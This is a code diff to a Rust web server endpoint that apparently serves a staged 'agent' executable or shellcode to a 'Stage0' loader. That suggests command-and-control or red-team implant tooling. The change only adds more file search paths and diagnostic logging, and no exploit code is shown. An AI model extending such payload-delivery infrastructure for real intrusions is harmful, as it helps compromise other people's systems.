@@ -543,29 +543,53 @@ pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
     
     // Stage0 now executes agent as a process, so we serve the EXE directly
     // (not shellcode). Prioritize .exe over .bin
+    // Multiple paths to support different deployment scenarios
     let agent_paths = [
-        "dist/agent.exe",      // EXE version (preferred for process execution)
-        "agent.exe",           // EXE in current dir
-        "../dist/agent.exe",   // EXE relative
-        "modules/agent.exe",   // EXE in modules
-        "dist/agent.bin",      // Fallback to shellcode
+        // Same directory as server (common deployment)
+        "agent.exe",
         "agent.bin",
+        // Subdirectories
+        "dist/agent.exe",
+        "dist/agent.bin",
+        "agent/agent.exe",      // Pi deployment structure
+        "agent/agent.bin",
+        "modules/agent.exe",
+        "modules/agent.bin",
+        // Parent directory
+        "../agent.exe",
+        "../dist/agent.exe",
+        "../agent/agent.exe",
     ];
     
     let agent_path = agent_paths.iter().find(|p| std::path::Path::new(p).exists());
     
+    // Log which paths were checked for debugging
+    if agent_path.is_none() {
+        tracing::warn!("Agent not found. Searched paths:");
+        for path in agent_paths.iter() {
+            tracing::warn!("  - {} (exists: {})", path, std::path::Path::new(path).exists());
+        }
+        // Also log current working directory
+        if let Ok(cwd) = std::env::current_dir() {
+            tracing::warn!("  Current directory: {:?}", cwd);
+        }
+    }
+    
     let agent_bytes = match agent_path {
-        Some(path) => match fs::read(path) {
-            Ok(bytes) => bytes,
-            Err(e) => {
-                tracing::error!("Error reading agent: {}", e);
-                return (
-                    StatusCode::INTERNAL_SERVER_ERROR,
-                    [(header::CONTENT_TYPE, "application/octet-stream")],
-                    format!("ERROR:Failed to read agent: {}", e).into_bytes(),
-                );
+        Some(path) => {
+            tracing::info!("Found agent at: {}", path);
+            match fs::read(path) {
+                Ok(bytes) => bytes,
+                Err(e) => {
+                    tracing::error!("Error reading agent from {}: {}", path, e);
+                    return (
+                        StatusCode::INTERNAL_SERVER_ERROR,
+                        [(header::CONTENT_TYPE, "application/octet-stream")],
+                        format!("ERROR:Failed to read agent: {}", e).into_bytes(),
+                    );
+                }
             }
-        },
+        }
         None => {
             tracing::error!("Agent not found in any expected path");
             return (
